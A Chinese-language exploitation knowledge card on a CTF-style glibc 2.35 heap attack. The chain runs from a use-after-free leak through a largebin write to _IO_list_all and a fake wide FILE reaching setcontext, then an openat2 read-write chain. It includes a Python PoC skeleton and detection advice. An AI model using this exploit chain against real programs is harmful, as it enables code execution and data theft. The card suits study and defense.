---
id: binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw
title: glibc 2.35 largebin attack 改 _IO_list_all：fake wide FILE 经 setcontext 转 openat2 ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: largebin-io-list-all-wide-file-orw
tags:
- pwn
- heap
- glibc235
- largebin
- fsop
- io-list-all
- wide-file
- setcontext
- seccomp
- orw
- openat2
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V94
  verified_at: '2026-11-05T19:50:49+08:00'
  notes: 已对照原文及17张图核对：main_arena+0x60=libc+0x21ace0 泄露、0x421/0x431 fake chunk 与 0x21 小 chunk 头修补、free(6) 使 fake 0x430 进 unsorted、largebin 0x400-0x430 corrupt、bk_nextsize=_IO_list_all-0x20、_IO_list_all 被改为堆地址(图15)、_IO_wfile_jumps+0x30、setcontext+0x3d、openat2(437) r10 size、p16(0x1000) 触发 exit，均与原文/截图一致；trace 显示 /flag→flag{1111}。修正：affected_versions 原为 glibc 2.35（Ubuntu 2.35-0ubuntu3.13，原文实测），属目标运行环境版本而非受影响区间，按 brief 已 --clear，待版本信息写入 notes。小瑕疵：正文'leak[:8]'与 EXP/PoC 的 leak[:6] 不一致，不影响利用。未验证点：EXP 未本机复跑；frontmatter无sources/source_url。
url: /docs/binary/pwn/heap/binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw/
draft: false
kb_aliases:
- largebin attack _IO_list_all
- wide FILE setcontext
- glibc 2.35 FSOP
- openat2 ORW
- _IO_wfile_jumps 偏移
- protokms
---

## 一句话结论

在 glibc 2.35 上，把 UAF stale slot 扩展成“free 伪造 0x430 chunk 进 unsorted → largebin 插入时用 `bk_nextsize` 写 `_IO_list_all` → 伪造 wide FILE 走 `_IO_wfile_jumps` 路径 → `setcontext+0x3d` 从堆上恢复上下文 → openat2/read/write”的完整链，即可在 seccomp 只允许 ORW 的环境里读出 flag。

## 原理

- **入口仍是应用层 UAF**：CREATE 失败路径先 `calloc`、先写全局槽位、再校验长度，失败后 `free` 不清槽位，得到稳定的 stale pointer；READ 按长度返回该块内容，UPDATE 可写该块。
- **泄露**：把 stale slot 指向的 chunk 释放进 unsorted bin 后，READ 读回 `fd/bk`。示例 libc 中 unsorted bin 头为 `main_arena + 0x60 = libc + 0x21ace0`，由 `leak[:8]` 算 libc 基址；`leak[8:16]` 中的堆指针用于算 heap 基址。
- **堆布局细节**：`CREATE` 用 `calloc`，glibc 2.35 的 `__libc_calloc` 不做 `malloc` 入口的 tcache fast path，而是直接走 `_int_malloc`；因此先做 7 次同 size `add/free` 把 tcache 填满后，后面的 `calloc` 仍会从 top/arena 切块，布局更可预测。
- **伪造 largebin victim**：在一个可控大块内伪造 `size = 0x431` 的 chunk 头，并把相邻小 chunk 的 `size` 补成 `0x21`，让 `_int_free` 的一致性检查（`PREV_INUSE`、next chunk 边界、邻块 size）通过。`0x430` 超过默认 tcache 最大 chunk `0x410`，且不小于 `MIN_LARGE_SIZE 0x400`，free 后先进入 unsorted，后续被 `_int_malloc` 整理进 largebin。
- **largebin attack 的写原语**：largebin 插入维护同尺寸链时会执行 `victim->bk_nextsize->fd_nextsize = victim`；`fd_nextsize` 位于 chunk + 0x20，因此把 `victim->bk_nextsize` 设为 `target - 0x20`，写入落点就是 `*(target) = victim`。令 `target = _IO_list_all`，即可把 FILE 链表头改成堆上的 fake FILE。
- **fake wide FILE**：`_IO_flush_all_lockp` 在 exit 时遍历 `_IO_list_all`，按 `_mode` 与 `_wide_data->write_ptr > write_base` 判断是否 flush。把 `_mode` 置 1、伪造 `_wide_data` 使写指针大于基址，即进入 wide FILE 路径；主 vtable 用 `_IO_wfile_jumps + 0x30`，仍落在 `__libc_IO_vtables` 合法区间内，可绕过 `IO_validate_vtable`。
- **转入 setcontext**：wide FILE 路径最终调用到 `setcontext+0x3d`；该版本 `setcontext` 从 `rdx` 指向的上下文区恢复 `rsp/rdi/rsi/rcx/r8/r9/r10/rdx` 等寄存器，从而把栈 pivot 到堆上预先布置的 ORW 链。
- **seccomp 下 ORW**：用 `openat2`（syscall 437，不是 openat）打开 `/flag`，第 4 个参数 `size` 走 `r10`，需找 `mov r10, ...` 类 gadget 或 `add r10, rdx` gadget；随后 `read(fd, buf, len)`、`write(1, buf, len)` 输出 flag。
- **触发退出**：主循环限制包长 `<= 0x3ff`；发送 `p16(0x1000)` 会打印 `[FATAL] Invalid packet length.` 并退出，正好触发 `_IO_flush_all_lockp`。

## 触发条件

- glibc 2.35（实测 `Ubuntu GLIBC 2.35-0ubuntu3.13`），其他版本需重新核对 `main_arena`、`_IO_wfile_jumps`、`setcontext` 偏移；
- 存在可稳定制造的 UAF/stale slot（见关联卡），以及 READ/UPDATE 读写原语；
- 能控制至少一块较大的可写堆块，用于伪造 chunk 头与 fake FILE；
- 已知 libc 与 heap 基址；
- 程序最终会走 `exit()`/`main` 返回，且 seccomp 允许 `openat2/read/write`（或改用 openat/read/write）。

## 利用步骤

1. 用 7 次同 size `add/free` 预热 tcache；利用 `calloc` 不走 tcache fast path 的特性，用 top split 固定后续 chunk 布局。
2. 通过失败 CREATE 制造 stale slot；用另一个 id 复用同一 chunk，形成 stale/live alias。
3. 释放 alias 指向的 chunk 进 unsorted bin，READ 泄露 `main_arena+0x60` 与堆指针，计算 libc/heap 基址。
4. 在可控大块中伪造 `0x421/0x431` chunk 头，补齐相邻 `0x21` 小 chunk 头；用 stale slot free 伪造的 `0x430` chunk，使其进入 unsorted。
5. 在它被整理进 largebin 前，重写 fake chunk 的 `bk_nextsize = _IO_list_all - 0x20`；继续推进分配，触发 largebin 插入，把 `_IO_list_all` 写成 victim 堆地址。
6. 在同一堆区伪造 wide FILE：`_mode=1`、`_wide_data` 满足 flush 条件、`vtable=_IO_wfile_jumps+0x30`，并让路径落到 `setcontext+0x3d`；在另一块堆区布置上下文与 ORW 链。
7. 发送超长包触发 FATAL/exit；`_IO_flush_all_lockp` 命中 fake FILE，经 `_IO_wfile_*` 到 `setcontext+0x3d`，pivot 到 ORW。
8. ORW：`openat2(AT_FDCWD, "/flag", 0x18, ...)` → `read(3, buf, 0x30)` → `write(1, buf, len)`。

## PoC

关键布局（偏移以原文 2.35-0ubuntu3.13 为准；完整交互脚本较长，以下为可复用骨架）：

```python
# 1) 泄露
leak = show(3).cred.secret_key
libc.address = u64(leak[:6].ljust(8, b'\x00')) - 0x21ace0
heap = u64(leak[8:14].ljust(8, b'\x00'))

# 2) 伪造 0x430 largebin victim，并补相邻 chunk 头
pay = b'a' * 0x100 + flat(0, 0x421, 0, 0, 0, 0, 0, 0x431)
add(4, 'aaa', 0x210, pay.ljust(0x210, b'\0'))
edit(8, 0x3f0, b'a' * 0xe0 + flat(0, 0x21, 0, 0, 0, 0x21, 0, 0, 0, 0x21, 0, 0, 0, 0x21))
free(6)                     # stale slot 6 -> free fake 0x430，进 unsorted

# 3) 在整理进 largebin 前改 bk_nextsize
target = libc.sym['_IO_list_all']
pay = b'a' * 0x100 + flat(0, 0x421, 0, 0, 0, 0, 0, 0x431, 0, 0, 0, target - 0x20)
edit(4, 0x210, pay.ljust(0x210, b'\0'))
free(1); free(12); add(12, 'aaa', 0x100, b'a')   # 推动 unsorted -> largebin

# 4) fake wide FILE + setcontext
heap_addr = heap + 0x960
fake_addr = heap - 0x220
pay = flat({
    0x0:  b'/bin/sh\0',
    0x8:  p64(1),                                   # wide write_base / mode
    0x10: p64(heap_addr),                           # wide write_ptr / rdx
    0x18: p64(libc.sym['setcontext'] + 0x3d),       # call
    0x88: p64(fake_addr + 0x30),                    # _lock
    0xa0: p64(fake_addr - 0x10),                    # _wide_data
    0xc0: p64(1),                                   # _mode
    0xd0: p64(fake_addr),                           # rax
    0xd8: p64(libc.sym['_IO_wfile_jumps'] + 0x30),  # 合法 vtable + 偏移
}, filler=b'\0')
edit(4, 0x210, (b'a' * 0x100 + pay).ljust(0x210, b'\0'))

# 5) ORW（openat2 = 437，第 4 参数 size 走 r10）
pay = flat(437, rdi, -0x64, rsi, flag_addr, rdx, 0x18, 0,
           add_r10_rdx, rdx, heap + 0x20, 0, syscall)
pay += flat(rax, 0, rdi, 3, rsi, buf_addr, rdx, 0x30, 0, syscall)
pay += flat(rax, 1, rdi, 1, rsi, buf_addr, syscall)
edit(13, 0x210, pay.ljust(0x210, b'\0'))

p.send(p16(0x1000))   # 非法长度 -> FATAL -> exit -> fake FILE -> ORW
```

原文 `tracefull` 验证结果：`openat2("/flag", 0x18)` 返回 fd 3，`read(3, "flag{1111}", 48)` 返回 10，随后 `write(1, ...)` 输出 flag；exit 后的崩溃不影响已完成的 ORW。

## 变体与关联

- **泄露**：也可用 unsorted bin 泄露卡中的方法（free 大于 tcache 上限的块 + guard 防止并入 top）先拿 libc，再用堆指针算 heap。
- **FSOP 变体**：House of Apple 2 直接覆盖 `_IO_2_1_stderr_` 并用 `_wide_data->_wide_vtable+0x68` 调 `system`；本链改 `_IO_list_all` 并在 wide FILE 路径中用 `setcontext+0x3d` 转 ORW，适合不能 `system`、只能 ORW 的 seccomp 环境。
- **largebin 目标变体**：`_IO_list_all` 之外还可写 `__malloc_hook`/`__free_hook`（旧版本）、`_IO_2_1_stdout_` 等；`target - 0x20` 的偏移固定由 `fd_nextsize` 位置决定。
- **版本差异**：glibc 2.35 之后对 FSOP 与 vtable 的校验持续收紧；`setcontext` 的寄存器来源在不同版本可能是 `rdi` 或 `rdx`，需按目标 libc 反汇编确认。
- 关联：[[binary-pwn-heap-stale-slot-create-failure-uaf]]（本链入口）、[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（泄露）、[[binary-pwn-heap-house-of-apple-2-stderr-fsop]]（FSOP 对照）。

## 检测与防御

- 检测：exit 阶段异常调用栈 `_IO_flush_all_lockp → _IO_wfile_* → setcontext`；`_IO_list_all` 指向堆而非 libc 的 `_IO_2_1_stderr_`；largebin 中出现伪造的 `0x430` 块与异常 `bk_nextsize`；进程出现面向堆的 ORW syscall 链。
- 检测：审计 CREATE 失败路径的槽位清理，修复 UAF 根因；对 `free` 后仍被 READ/UPDATE 的调用序列告警。
- 防御：及时升级 glibc 并跟进 FSOP/vtable 加固；启用堆元数据完整性检查、ASan/Valgrind；Full RELRO/PIE 不能阻止本链，不能替代堆安全。
- 防御：seccomp 只放行 ORW 时要限制 `openat2` 的路径与 `size` 参数，并监控异常 syscall 链；但根本上仍需消除 UAF。
